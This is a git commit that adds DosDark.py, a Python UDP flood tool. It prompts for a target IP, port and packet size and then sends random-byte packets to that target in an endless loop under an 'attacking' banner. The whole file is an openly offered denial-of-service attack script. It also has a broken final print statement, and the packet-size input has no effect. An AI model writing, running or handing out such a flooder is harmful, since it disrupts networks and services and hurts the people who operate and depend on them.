2e5ad71ebe2ad0166f44693fc2497f89c78c8437
V1 MoDzZz <67358940+V1MoDzZz@users.noreply.github.com>
2020-11-15 02:39:05 +0500

    Denial-of-service Dark

---
+++ DosDark.py
@@ -0,0 +1,52 @@
+import sys
+import os
+import time
+import socket
+import random
+import threading
+
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+sys.ps1 = '\033[01;32m '
+print(sys.ps1)
+print('''
+
+ ######     #    ######  #    # 
+ #     #   # #   #     # #   #  
+ #     #  #   #  #     # #  #   
+ #     # #     # ######  ###    
+ #     # ####### #   #   #  #   
+ #     # #     # #    #  #   #  
+ ######  #     # #     # #    # 
+                                
+
+''')
+
+
+ip1 = input("Enter The IP of target : ")
+port1 = int(input("Enter the Port : "))
+size1 = int(input("Enter Packet size : "))
+
+os.system("clear")
+
+print(" connecting please wait...")
+
+s1 = int(size1)
+print("===================================================================")
+print(" ")
+print("Attacking Target %s : %s with packet size %s"%(ip1,port1,s1))
+print(" ")
+print("===================================================================")
+while True:
+     sock.sendto(bytes, (ip1,port1))
+     print("attacking ", ip1, ":", port1")
